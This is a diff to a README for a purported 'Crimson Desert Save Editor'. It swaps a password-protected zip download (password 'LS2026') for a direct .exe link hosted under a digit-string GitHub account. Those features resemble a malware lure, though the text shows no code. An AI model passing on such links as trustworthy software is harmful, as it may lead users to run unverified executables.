@@ -27,8 +27,7 @@ Complete ready-to-use **Crimson Desert Save Editor** — the most powerful save 
 - 
 ---
 ## 📥 Download
-📥 [Download `Crimson-Desert-Save-Editor.zip`](https://github.com/12344466666666667777777777/Crimson-Desert-Save-Editor-Mod-For-PC/releases/download/Game-Addons/CrimsonDesert-SaveEditor.zip)  
-🔐 `LS2026`
+📥 [Download `CrimsonDesert-SaveEditor.exe`](https://github.com/12344466666666667777777777/Crimson-Desert-Save-Editor-Mod-For-PC/releases/download/Game-Addons/CrimsonDesert-SaveEditor.exe)  
 ---
 ### Archive Contents
 - `CrimsonDesert_SaveEditor.exe` – main save editor application
